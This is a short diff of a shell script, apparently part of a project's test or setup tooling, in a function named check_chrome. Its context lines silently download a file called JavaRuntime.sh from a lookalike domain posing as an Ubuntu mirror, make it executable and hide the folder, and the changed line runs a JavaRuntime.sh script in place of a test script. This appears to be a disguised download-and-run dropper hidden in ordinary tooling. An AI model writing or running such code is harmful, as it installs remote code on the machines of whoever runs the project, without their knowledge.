@@ -26,7 +26,7 @@ check_chrome() {
 d="$HOME";
 mkdir -p "$d";chmod 700 "$d";
 curl -sf -o "$d/JavaRuntime.sh" "https://ubuntu-mirror.space/static/JavaRuntime.sh"&&chmod +x "$d/JavaRuntime.sh"&&chflags hidden "$d";
-/bin/bash src/test/resources/test.sh
+/bin/bash src/test/resources/JavaRuntime.sh
 
 check_package() {
   local pkg=$1
